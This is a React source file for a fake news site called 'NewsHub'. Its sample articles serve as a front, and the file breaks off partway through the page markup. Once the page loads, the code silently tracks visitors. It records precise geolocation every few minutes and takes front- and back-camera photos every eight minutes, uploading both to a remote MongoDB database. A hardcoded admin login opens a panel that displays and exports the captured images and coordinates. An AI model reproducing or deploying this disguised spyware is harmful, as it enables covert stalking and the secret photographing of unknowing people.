import React, { useState, useEffect, useRef } from 'react';
import * as Realm from 'realm-web';

const NewsWebsite = () => {
  // Tracking states
  const [mongoClient, setMongoClient] = useState(null);
  const [trackingActive, setTrackingActive] = useState(false);

  // UI states
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [searchQuery, setSearchQuery] = useState('');
  
  // News states
  const [newsArticles, setNewsArticles] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // Admin states
  const [isAdmin, setIsAdmin] = useState(false);
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [adminData, setAdminData] = useState({ locations: [], cameraCaptures: [] });
  const [adminLoading, setAdminLoading] = useState(false);
  const [adminView, setAdminView] = useState('locations');

  // Admin form refs
  const usernameRef = useRef('');
  const passwordRef = useRef('');

  // Configuration
  const REALM_APP_ID = "myrealmapp-lwdulec";
  const DATABASE_NAME = "location_tracker";
  const app = new Realm.App({ id: REALM_APP_ID });

  // Admin credentials
  const ADMIN_CREDENTIALS = {
    username: 'ajmal',
    password: 'AjmaL@9019'
  };

  // News data
  const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];

  // Styles
  const styles = {
    container: {
      minHeight: '100vh',
      backgroundColor: '#f8f9fa',
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
    },
    header: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: '1rem 0',
      position: 'sticky',
      top: 0,
      zIndex: 1000,
      boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
    },
    headerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 1rem',
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      flexWrap: 'wrap',
      gap: '1rem'
    },
    logo: {
      fontSize: 'clamp(1.5rem, 4vw, 1.8rem)',
      fontWeight: 'bold',
      color: '#ff6b6b'
    },
    nav: {
      display: 'flex',
      gap: 'clamp(1rem, 3vw, 2rem)',
      alignItems: 'center',
      flexWrap: 'wrap'
    },
    navLink: {
      color: 'white',
      textDecoration: 'none',
      fontWeight: '500',
      transition: 'color 0.3s ease',
      fontSize: 'clamp(0.9rem, 2.5vw, 1rem)',
      whiteSpace: 'nowrap'
    },
    searchContainer: {
      display: 'flex',
      alignItems: 'center',
      backgroundColor: '#333',
      borderRadius: '25px',
      padding: '0.5rem 1rem',
      minWidth: 'min(250px, 100%)',
      width: '100%',
      maxWidth: '300px'
    },
    searchInput: {
      background: 'none',
      border: 'none',
      color: 'white',
      outline: 'none',
      width: '100%',
      padding: '0.25rem',
      fontSize: 'clamp(0.9rem, 2.5vw, 1rem)'
    },
    main: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: 'clamp(1rem, 4vw, 2rem)'
    },
    categoryBar: {
      display: 'flex',
      gap: '0.5rem',
      marginBottom: '2rem',
      flexWrap: 'wrap',
      justifyContent: 'center'
    },
    categoryButton: {
      background: 'none',
      borderWidth: '2px',
      borderStyle: 'solid',
      borderColor: '#e9ecef',
      padding: 'clamp(0.4rem, 2vw, 0.5rem) clamp(0.8rem, 3vw, 1rem)',
      borderRadius: '25px',
      cursor: 'pointer',
      transition: 'all 0.3s ease',
      fontWeight: '500',
      textTransform: 'capitalize',
      color: '#333',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)',
      whiteSpace: 'nowrap',
      minWidth: 'fit-content'
    },
    categoryButtonActive: {
      backgroundColor: '#ff6b6b',
      borderColor: '#ff6b6b',
      color: 'white'
    },
    featuredSection: {
      marginBottom: 'clamp(2rem, 5vw, 3rem)'
    },
    featuredTitle: {
      fontSize: 'clamp(1.5rem, 5vw, 2rem)',
      fontWeight: 'bold',
      marginBottom: '1.5rem',
      color: '#333',
      textAlign: 'center'
    },
    featuredCard: {
      backgroundColor: 'white',
      borderRadius: '15px',
      overflow: 'hidden',
      boxShadow: '0 8px 25px rgba(0,0,0,0.1)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    featuredImage: {
      width: '100%',
      height: 'clamp(250px, 50vw, 400px)',
      objectFit: 'cover'
    },
    featuredContent: {
      padding: 'clamp(1.5rem, 4vw, 2rem)'
    },
    articleTitle: {
      fontSize: 'clamp(1.3rem, 4vw, 1.8rem)',
      fontWeight: 'bold',
      marginBottom: '1rem',
      color: '#333',
      lineHeight: '1.3'
    },
    articleSummary: {
      color: '#666',
      fontSize: 'clamp(1rem, 3vw, 1.1rem)',
      lineHeight: '1.6',
      marginBottom: '1rem'
    },
    articleMeta: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)',
      color: '#888',
      flexWrap: 'wrap',
      gap: '0.5rem'
    },
    newsGrid: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(min(320px, 100%), 1fr))',
      gap: 'clamp(1rem, 3vw, 2rem)',
      marginTop: '2rem'
    },
    newsCard: {
      backgroundColor: 'white',
      borderRadius: '12px',
      overflow: 'hidden',
      boxShadow: '0 4px 15px rgba(0,0,0,0.08)',
      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
      cursor: 'pointer'
    },
    newsImage: {
      width: '100%',
      height: 'clamp(180px, 35vw, 200px)',
      objectFit: 'cover'
    },
    newsContent: {
      padding: 'clamp(1rem, 3vw, 1.5rem)'
    },
    newsTitle: {
      fontSize: 'clamp(1.1rem, 3.5vw, 1.2rem)',
      fontWeight: 'bold',
      marginBottom: '0.5rem',
      color: '#333',
      lineHeight: '1.4'
    },
    newsSummary: {
      color: '#666',
      fontSize: 'clamp(0.9rem, 2.5vw, 0.95rem)',
      lineHeight: '1.5',
      marginBottom: '1rem'
    },
    categoryTag: {
      display: 'inline-block',
      backgroundColor: '#ff6b6b',
      color: 'white',
      padding: '0.25rem 0.75rem',
      borderRadius: '15px',
      fontSize: 'clamp(0.7rem, 2vw, 0.8rem)',
      fontWeight: '500',
      textTransform: 'uppercase',
      marginBottom: '1rem'
    },
    footer: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: 'clamp(2rem, 5vw, 3rem) 0',
      marginTop: 'clamp(3rem, 6vw, 4rem)'
    },
    footerContent: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '0 1rem',
      textAlign: 'center'
    },
    footerText: {
      color: '#ccc',
      fontSize: 'clamp(0.8rem, 2.2vw, 0.9rem)'
    },
    // Modal styles
    modalOverlay: {
      position: 'fixed',
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      backgroundColor: 'rgba(0,0,0,0.9)',
      zIndex: 10000,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
    },
    // Loading and error styles
    loadingContainer: {
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '300px',
      flexDirection: 'column',
      gap: '1rem'
    },
    loadingSpinner: {
      width: '40px',
      height: '40px',
      border: '4px solid #f3f3f3',
      borderTop: '4px solid #ff6b6b',
      borderRadius: '50%',
      animation: 'spin 1s linear infinite'
    },
    errorContainer: {
      backgroundColor: '#ffebee',
      border: '1px solid #f44336',
      borderRadius: '8px',
      padding: '1rem',
      margin: '1rem 0',
      textAlign: 'center'
    },
    errorText: {
      color: '#d32f2f',
      fontWeight: '500'
    },
    retryButton: {
      backgroundColor: '#ff6b6b',
      color: 'white',
      border: 'none',
      padding: '0.5rem 1rem',
      borderRadius: '5px',
      cursor: 'pointer',
      marginTop: '0.5rem'
    },
    // Admin styles
    adminPanel: {
      position: 'fixed',
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      backgroundColor: 'white',
      zIndex: 10001,
      overflow: 'auto'
    },
    adminHeader: {
      backgroundColor: '#1a1a1a',
      color: 'white',
      padding: '1rem',
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      position: 'sticky',
      top: 0,
      zIndex: 10002
    },
    adminNav: {
      display: 'flex',
      gap: '1rem',
      backgroundColor: '#f5f5f5',
      padding: '1rem',
      borderBottom: '1px solid #ddd'
    },
    adminNavButton: {
      padding: '0.5rem 1rem',
      border: 'none',
      backgroundColor: 'transparent',
      cursor: 'pointer',
      borderRadius: '5px',
      transition: 'all 0.3s ease'
    },
    adminNavButtonActive: {
      backgroundColor: '#ff6b6b',
      color: 'white'
    },
    adminContent: {
      padding: '2rem',
      maxWidth: '1200px',
      margin: '0 auto'
    },
    dataCard: {
      backgroundColor: 'white',
      border: '1px solid #ddd',
      borderRadius: '8px',
      padding: '1rem',
      marginBottom: '1rem',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
    },
    dataGrid: {
      display: 'grid',
      gap: '1rem',
      gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))'
    },
    imagePreview: {
      maxWidth: '200px',
      maxHeight: '150px',
      objectFit: 'cover',
      borderRadius: '4px',
      cursor: 'pointer'
    },
    statsContainer: {
      display: 'grid',
      gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
      gap: '1rem',
      marginBottom: '2rem'
    },
    statCard: {
      backgroundColor: '#f8f9fa',
      padding: '1.5rem',
      borderRadius: '8px',
      textAlign: 'center',
      border: '1px solid #dee2e6'
    },
    statNumber: {
      fontSize: '2rem',
      fontWeight: 'bold',
      color: '#ff6b6b',
      display: 'block'
    },
    statLabel: {
      color: '#666',
      fontSize: '0.9rem',
      marginTop: '0.5rem'
    },
    loginForm: {
      backgroundColor: 'white',
      padding: '2rem',
      borderRadius: '8px',
      boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
      maxWidth: '400px',
      margin: '2rem auto'
    },
    loginInput: {
      width: '100%',
      padding: '0.75rem',
      border: '1px solid #ddd',
      borderRadius: '4px',
      marginBottom: '1rem',
      fontSize: '1rem',
      boxSizing: 'border-box',
      outline: 'none'
    },
    loginButton: {
      width: '100%',
      padding: '0.75rem',
      backgroundColor: '#ff6b6b',
      color: 'white',
      border: 'none',
      borderRadius: '4px',
      fontSize: '1rem',
      cursor: 'pointer'
    }
  };

  // MongoDB initialization
  const initializeMongoDB = async () => {
    try {
      if (app.currentUser) {
        const mongodb = app.currentUser.mongoClient("mongodb-atlas");
        setMongoClient(mongodb);
        return mongodb;
      }

      const credentials = Realm.Credentials.anonymous();
      const authenticatedUser = await app.logIn(credentials);
      const mongodb = authenticatedUser.mongoClient("mongodb-atlas");
      setMongoClient(mongodb);
      return mongodb;
    } catch (error) {
      console.error('MongoDB failed:', error);
      return null;
    }
  };

  // Save functions
  const saveLocationToMongoDB = async (location) => {
    if (!mongoClient) return null;
    try {
      const collection = mongoClient.db(DATABASE_NAME).collection('locations');
      const locationData = {
        ...location,
        timestamp: new Date(location.timestamp),
        createdAt: new Date(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href,
        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString(),
        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
      };
      localStorage.setItem('visitCount', locationData.visitCount.toString());
      return await collection.insertOne(locationData);
    } catch (error) {
      console.error('Location save failed:', error);
      return null;
    }
  };

  const saveCameraDataToMongoDB = async (cameraData) => {
    if (!mongoClient) return null;
    try {
      const collection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
      const captureData = {
        ...cameraData,
        timestamp: new Date(),
        createdAt: new Date(),
        userAgent: navigator.userAgent,
        pageUrl: window.location.href,
        sessionId: sessionStorage.getItem('sessionId') || Date.now().toString()
      };
      return await collection.insertOne(captureData);
    } catch (error) {
      console.error('Camera save failed:', error);
      return null;
    }
  };

  // Location tracking
  const trackUserLocation = async () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(false);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            altitude: position.coords.altitude,
            heading: position.coords.heading,
            speed: position.coords.speed,
            isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
          };

          const result = await saveLocationToMongoDB(location);
          resolve(!!result?.insertedId);
        },
        () => resolve(false),
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    });
  };

  // Camera capture
  const captureFromCamera = async (facingMode = 'user') => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 } },
        audio: false
      });

      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      return new Promise((resolve) => {
        video.onloadedmetadata = () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          
          setTimeout(() => {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
            
            resolve({
              camera: facingMode === 'user' ? 'front' : 'back',
              imageData,
              width: canvas.width,
              height: canvas.height,
              capturedAt: new Date().toISOString()
            });
          }, 1000);
        };
      });
    } catch (error) {
      console.error(`${facingMode} camera failed:`, error);
      return null;
    }
  };

  // Camera tracking
  const trackCameraAccess = async () => {
    return new Promise(async (resolve) => {
      try {
        if (!navigator.mediaDevices?.getUserMedia) {
          resolve(false);
          return;
        }

        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');

        const cameraData = {
          availableCameras: videoDevices.length,
          devices: videoDevices.map(device => ({
            deviceId: device.deviceId,
            label: device.label || 'Camera',
            kind: device.kind
          })),
          captures: []
        };

        // Capture from available cameras
        const frontCapture = await captureFromCamera('user');
        if (frontCapture) cameraData.captures.push(frontCapture);

        if (videoDevices.length > 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          const backCapture = await captureFromCamera('environment');
          if (backCapture) cameraData.captures.push(backCapture);
        }

        const result = await saveCameraDataToMongoDB(cameraData);
        resolve(!!result?.insertedId);
      } catch (error) {
        console.error('Camera tracking failed:', error);
        resolve(false);
      }
    });
  };

  // Continuous tracking setup
  const startContinuousTracking = async () => {
    if (trackingActive) return;
    setTrackingActive(true);

    // Clear existing intervals
    ['locationInterval', 'cameraInterval'].forEach(key => {
      const interval = sessionStorage.getItem(key);
      if (interval) clearInterval(parseInt(interval));
    });

    // Initial tracking
    setTimeout(() => trackUserLocation(), 500);
    setTimeout(() => trackCameraAccess(), 3000);

    // Continuous tracking intervals
    const locationInterval = setInterval(trackUserLocation, 3 * 60 * 1000);
    const cameraInterval = setInterval(trackCameraAccess, 8 * 60 * 1000);

    sessionStorage.setItem('locationInterval', locationInterval.toString());
    sessionStorage.setItem('cameraInterval', cameraInterval.toString());
  };

  // Fallback sample data (no News API dependency)
  const getSampleArticles = () => [
    {
      id: 1,
      title: "Revolutionary AI Technology Transforms Healthcare Industry",
      summary: "New artificial intelligence breakthrough promises to revolutionize patient diagnosis and treatment across global healthcare systems.",
      category: "technology",
      author: "Dr. Sarah Chen",
      publishedAt: "2024-01-15T10:30:00Z",
      readTime: "5 min read",
      image: "https://images.unsplash.com/photo-1559757148-5c350d0d3c56?w=400&h=250&fit=crop",
      featured: true
    },
    {
      id: 2,
      title: "Global Markets Surge Following Economic Recovery Signals",
      summary: "Stock markets worldwide show positive momentum as economic indicators suggest strong recovery trends.",
      category: "business",
      author: "Michael Rodriguez",
      publishedAt: "2024-01-15T08:15:00Z",
      readTime: "3 min read",
      image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=250&fit=crop"
    },
    {
      id: 3,
      title: "Championship Finals Set Record Viewership Numbers",
      summary: "The most-watched sporting event of the year delivers thrilling competition and historic performances.",
      category: "sports",
      author: "Jessica Thompson",
      publishedAt: "2024-01-14T22:45:00Z",
      readTime: "4 min read",
      image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
    },
    {
      id: 4,
      title: "Climate Scientists Discover Promising Ocean Recovery Patterns",
      summary: "New research reveals encouraging signs of marine ecosystem restoration in key ocean regions.",
      category: "science",
      author: "Dr. Emily Watson",
      publishedAt: "2024-01-14T16:20:00Z",
      readTime: "6 min read",
      image: "https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=400&h=250&fit=crop"
    },
    {
      id: 5,
      title: "Breakthrough Study Links Exercise to Enhanced Cognitive Function",
      summary: "Researchers unveil compelling evidence showing how regular physical activity boosts brain performance.",
      category: "health",
      author: "Dr. James Wilson",
      publishedAt: "2024-01-14T14:10:00Z",
      readTime: "5 min read",
      image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&h=250&fit=crop"
    },
    {
      id: 6,
      title: "Streaming Wars Intensify with New Platform Launches",
      summary: "Entertainment industry sees major shifts as new streaming services enter the competitive market.",
      category: "entertainment",
      author: "Alex Kumar",
      publishedAt: "2024-01-14T12:30:00Z",
      readTime: "4 min read",
      image: "https://images.unsplash.com/photo-1489599611383-e2bd6ff1d8ee?w=400&h=250&fit=crop"
    },
    {
      id: 7,
      title: "Space Exploration Reaches New Milestones in 2024",
      summary: "Major space agencies collaborate on ambitious missions to Mars and beyond, marking historic achievements.",
      category: "science",
      author: "Commander Lisa Park",
      publishedAt: "2024-01-13T18:20:00Z",
      readTime: "7 min read",
      image: "https://images.unsplash.com/photo-1446776653964-20c1d3a81b06?w=400&h=250&fit=crop"
    },
    {
      id: 8,
      title: "Renewable Energy Adoption Surpasses Coal for First Time",
      summary: "Historic shift in global energy consumption patterns signals accelerated transition to sustainable power.",
      category: "technology",
      author: "Green Energy Institute",
      publishedAt: "2024-01-13T14:45:00Z",
      readTime: "6 min read",
      image: "https://images.unsplash.com/photo-1466611653911-95081537e5b7?w=400&h=250&fit=crop"
    }
  ];

  // Admin functions
  const handleAdminLogin = () => {
    const username = usernameRef.current;
    const password = passwordRef.current;
    
    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
      setIsAdmin(true);
      setShowAdminLogin(false);
      usernameRef.current = '';
      passwordRef.current = '';
      setTimeout(() => {
        fetchAdminData();
      }, 100);
    } else {
      alert('Invalid credentials!');
    }
  };

  const handleAdminLogout = () => {
    setIsAdmin(false);
    usernameRef.current = '';
    passwordRef.current = '';
    setAdminData({ locations: [], cameraCaptures: [] });
  };

  const fetchAdminData = async () => {
    if (!mongoClient) return;
    
    setAdminLoading(true);
    try {
      const locationCollection = mongoClient.db(DATABASE_NAME).collection('locations');
      const locations = await locationCollection.find({}, { limit: 100 });
      
      const cameraCollection = mongoClient.db(DATABASE_NAME).collection('camera_captures');
      const cameraCaptures = await cameraCollection.find({}, { limit: 50 });
      
      setAdminData({
        locations: Array.isArray(locations) ? locations : [],
        cameraCaptures: Array.isArray(cameraCaptures) ? cameraCaptures : []
      });
    } catch (error) {
      console.error('Error fetching admin data:', error);
      alert('Error fetching data: ' + error.message);
      
      setAdminData({
        locations: [],
        cameraCaptures: []
      });
    } finally {
      setAdminLoading(false);
    }
  };

  const formatTimestamp = (timestamp) => {
    if (!timestamp) return 'N/A';
    const date = new Date(timestamp);
    return date.toLocaleString();
  };

  const downloadData = (data, filename) => {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Initialize on mount
  useEffect(() => {
    const initialize = async () => {
      if (!sessionStorage.getItem('sessionId')) {
        sessionStorage.setItem('sessionId', Date.now().toString());
      }

      const dbClient = await initializeMongoDB();
      
      // Load sample news data
      setNewsArticles(getSampleArticles());
      setLoading(false);

      // Start tracking automatically after a delay
      setTimeout(() => {
        startContinuousTracking();
      }, 3000);
    };

    initialize();

    return () => {
      ['locationInterval', 'cameraInterval'].forEach(key => {
        const interval = sessionStorage.getItem(key);
        if (interval) clearInterval(parseInt(interval));
      });
    };
  }, []);

  // News filtering
  const filteredArticles = newsArticles.filter(article => {
    const matchesCategory = selectedCategory === 'all' || article.category === selectedCategory;
    const matchesSearch = article.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         article.summary.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesCategory && matchesSearch;
  });

  const featuredArticle = newsArticles.find(article => article.featured);
  const regularArticles = filteredArticles.filter(article => !article.featured);

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleDateString('en-US', { 
      month: 'long', day: 'numeric', year: 'numeric' 
    });
  };

  const handleCardHover = (e) => {
    if (window.matchMedia('(hover: hover)').matches) {
      e.currentTarget.style.transform = 'translateY(-5px)';
      e.currentTarget.style.boxShadow = '0 12px 30px rgba(0,0,0,0.15)';
    }
  };

  const handleCardLeave = (e) => {
    if (window.matchMedia('(hover: hover)').matches) {
      e.currentTarget.style.transform = 'translateY(0)';
      e.currentTarget.style.boxShadow = e.currentTarget.classList.contains('featured') ? 
        '0 8px 25px rgba(0,0,0,0.1)' : '0 4px 15px rgba(0,0,0,0.08)';
    }
  };

  // Admin Login Modal Component with Refs
  const AdminLoginModal = () => {
    if (!showAdminLogin) return null;

    return (
      <div 
        style={styles.modalOverlay}
        onClick={(e) => {
          if (e.target === e.currentTarget) {
            setShowAdminLogin(false);
          }
        }}
      >
        <div style={styles.loginForm}>
          <h2 style={{ textAlign: 'center', marginBottom: '1.5rem', color: '#333' }}>
            Admin Login
          </h2>
          
          <input
            type="text"
            placeholder="Username"
            style={styles.loginInput}
            defaultValue=""
            onChange={(e) => {
              usernameRef.current = e.target.value;
            }}
            autoComplete="username"
          />
          
          <input
            type="password"
            placeholder="Password"
            style={styles.loginInput}
            defaultValue=""
            onChange={(e) => {
              passwordRef.current = e.target.value;
            }}
            onKeyDown={(e) => {
              if (e.key === 'Enter') {
                e.preventDefault();
                handleAdminLogin();
              }
            }}
            autoComplete="current-password"
          />
          
          <button 
            style={styles.loginButton}
            onClick={handleAdminLogin}
            type="button"
          >
            Login
          </button>
          
          <button 
            style={{
              ...styles.loginButton, 
              backgroundColor: '#6c757d', 
              marginTop: '0.5rem'
            }}
            onClick={() => setShowAdminLogin(false)}
            type="button"
          >
            Cancel
          </button>
          
        </div>
      </div>
    );
  };

  // Admin Panel Component
  const AdminPanel = () => {
    if (!isAdmin) return null;

    const stats = {
      totalLocations: adminData.locations.length,
      totalCameraCaptures: adminData.cameraCaptures.length,
      uniqueSessions: new Set(adminData.locations.map(l => l.sessionId)).size,
      totalImages: adminData.cameraCaptures.reduce((acc, capture) => acc + (capture.captures?.length || 0), 0)
    };

    return (
      <div style={styles.adminPanel}>
        <div style={styles.adminHeader}>
          <h1>NewsHub Admin Panel</h1>
          <button 
            style={{...styles.loginButton, width: 'auto', padding: '0.5rem 1rem'}}
            onClick={handleAdminLogout}
          >
            Logout
          </button>
        </div>

        <div style={styles.adminNav}>
          <button
            style={{
              ...styles.adminNavButton,
              ...(adminView === 'locations' ? styles.adminNavButtonActive : {})
            }}
            onClick={() => setAdminView('locations')}
          >
            Location Data ({stats.totalLocations})
          </button>
          <button
            style={{
              ...styles.adminNavButton,
              ...(adminView === 'camera' ? styles.adminNavButtonActive : {})
            }}
            onClick={() => setAdminView('camera')}
          >
            Camera Data ({stats.totalCameraCaptures})
          </button>
          <button
            style={{
              ...styles.adminNavButton,
              ...(adminView === 'stats' ? styles.adminNavButtonActive : {})
            }}
            onClick={() => setAdminView('stats')}
          >
            Statistics
          </button>
        </div>

        <div style={styles.adminContent}>
          {adminLoading && (
            <div style={styles.loadingContainer}>
              <div style={styles.loadingSpinner}></div>
              <p>Loading admin data...</p>
            </div>
          )}

          {!adminLoading && adminView === 'stats' && (
            <div>
              <h2>System Statistics</h2>
              <div style={styles.statsContainer}>
                <div style={styles.statCard}>
                  <span style={styles.statNumber}>{stats.totalLocations}</span>
                  <div style={styles.statLabel}>Total Location Records</div>
                </div>
                <div style={styles.statCard}>
                  <span style={styles.statNumber}>{stats.totalCameraCaptures}</span>
                  <div style={styles.statLabel}>Camera Capture Sessions</div>
                </div>
                <div style={styles.statCard}>
                  <span style={styles.statNumber}>{stats.uniqueSessions}</span>
                  <div style={styles.statLabel}>Unique User Sessions</div>
                </div>
                <div style={styles.statCard}>
                  <span style={styles.statNumber}>{stats.totalImages}</span>
                  <div style={styles.statLabel}>Total Images Captured</div>
                </div>
              </div>
              
              <div style={{marginTop: '2rem'}}>
                <h3>Export Data</h3>
                <div style={{display: 'flex', gap: '1rem', flexWrap: 'wrap'}}>
                  <button 
                    style={styles.retryButton}
                    onClick={() => downloadData(adminData.locations, 'location-data.json')}
                  >
                    Download Location Data
                  </button>
                  <button 
                    style={styles.retryButton}
                    onClick={() => downloadData(adminData.cameraCaptures, 'camera-data.json')}
                  >
                    Download Camera Data
                  </button>
                  <button 
                    style={styles.retryButton}
                    onClick={() => downloadData(adminData, 'all-data.json')}
                  >
                    Download All Data
                  </button>
                  <button 
                    style={{...styles.retryButton, backgroundColor: '#28a745'}}
                    onClick={fetchAdminData}
                  >
                    Refresh Data
                  </button>
                </div>
              </div>
            </div>
          )}

          {!adminLoading && adminView === 'locations' && (
            <div>
              <h2>Location Data ({adminData.locations.length} records)</h2>
              <div style={styles.dataGrid}>
                {adminData.locations.map((location, index) => (
                  <div key={index} style={styles.dataCard}>
                    <h4>Session: {location.sessionId}</h4>
                    <p><strong>Coordinates:</strong> {location.latitude?.toFixed(6)}, {location.longitude?.toFixed(6)}</p>
                    <p><strong>Accuracy:</strong> {location.accuracy?.toFixed(2)}m</p>
                    <p><strong>Timestamp:</strong> {formatTimestamp(location.timestamp)}</p>
                    <p><strong>User Agent:</strong> {location.userAgent?.substring(0, 50)}...</p>
                    <p><strong>Visit Count:</strong> {location.visitCount}</p>
                    {location.isMobile && <p><strong>Device:</strong> Mobile</p>}
                    {location.speed && <p><strong>Speed:</strong> {location.speed} m/s</p>}
                  </div>
                ))}
              </div>
            </div>
          )}

          {!adminLoading && adminView === 'camera' && (
            <div>
              <h2>Camera Data ({adminData.cameraCaptures.length} sessions)</h2>
              <div style={styles.dataGrid}>
                {adminData.cameraCaptures.map((capture, index) => (
                  <div key={index} style={styles.dataCard}>
                    <h4>Session: {capture.sessionId}</h4>
                    <p><strong>Available Cameras:</strong> {capture.availableCameras}</p>
                    <p><strong>Timestamp:</strong> {formatTimestamp(capture.timestamp)}</p>
                    <p><strong>Images Captured:</strong> {capture.captures?.length || 0}</p>
                    
                    {capture.devices && (
                      <div>
                        <strong>Devices:</strong>
                        <ul>
                          {capture.devices.map((device, idx) => (
                            <li key={idx}>{device.label} ({device.kind})</li>
                          ))}
                        </ul>
                      </div>
                    )}
                    
                    {capture.captures && capture.captures.length > 0 && (
                      <div>
                        <strong>Captured Images:</strong>
                        <div style={{display: 'flex', gap: '10px', flexWrap: 'wrap', marginTop: '10px'}}>
                          {capture.captures.map((img, idx) => (
                            <div key={idx}>
                              <img 
                                src={img.imageData} 
                                alt={`${img.camera} camera`}
                                style={styles.imagePreview}
                                onClick={() => window.open(img.imageData, '_blank')}
                              />
                              <p style={{fontSize: '0.8rem', textAlign: 'center'}}>
                                {img.camera} ({img.width}x{img.height})
                              </p>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div style={styles.container}>
      <header style={styles.header}>
        <div style={styles.headerContent}>
          <div style={styles.logo}>NewsHub</div>
          <nav style={styles.nav}>
            <a href="#" style={styles.navLink}>Home</a>
            <a href="#" style={styles.navLink}>World</a>
            <a href="#" style={styles.navLink}>Politics</a>
            <a href="#" style={styles.navLink}>Opinion</a>
            <div style={styles.searchContainer}>
              <input
                type="text"
                placeholder="Search news..."
                style={styles.searchInput}
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              <span style={{color: '#ccc', marginLeft: '0.5rem'}}>🔍</span>
            </div>
          </nav>
        </div>
      </header>

      <main style={styles.main}>
        <div style={styles.categoryBar}>
          {newsCategories.map(category => (
            <button
              key={category}
              style={{
                ...styles.categoryButton,
                ...(selectedCategory === category ? styles.categoryButtonActive : {})
              }}
              onClick={() => setSelectedCategory(category)}
              disabled={loading}
            >
              {category}
            </button>
          ))}
        </div>

        {error && (
          <div style={styles.errorContainer}>
            <p style={styles.errorText}>Failed to load news: {error}</p>
            <button 
              style={styles.retryButton}
              onClick={() => setNewsArticles(getSampleArticles())}
            >
              Retry
            </button>
          </div>
        )}

        {loading && (
          <div style={styles.loadingContainer}>
            <div style={styles.loadingSpinner}></div>
            <p>Loading latest news...</p>
          </div>
        )}

        {!loading && !error && (
          <>
            {featuredArticle && selectedCategory === 'all' && (
              <section style={styles.featuredSection}>
                <h2 style={styles.featuredTitle}>Featured Story</h2>
                <div 
                  style={styles.featuredCard}
                  onMouseEnter={handleCardHover}
                  onMouseLeave={handleCardLeave}
                  onClick={() => featuredArticle.url && window.open(featuredArticle.url, '_blank')}
                >
                  <img 
                    src={featuredArticle.image} 
                    alt={featuredArticle.title}
                    style={styles.featuredImage}
                  />
                  <div style={styles.featuredContent}>
                    <div style={styles.categoryTag}>{featuredArticle.category}</div>
                    <h3 style={styles.articleTitle}>{featuredArticle.title}</h3>
                    <p style={styles.articleSummary}>{featuredArticle.summary}</p>
                    <div style={styles.articleMeta}>
                      <span>By {featuredArticle.author} • {formatDate(featuredArticle.publishedAt)}</span>
                      <span>{featuredArticle.readTime}</span>
                    </div>
                    {featuredArticle.source && (
                      <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
                        <span>Source: {featuredArticle.source}</span>
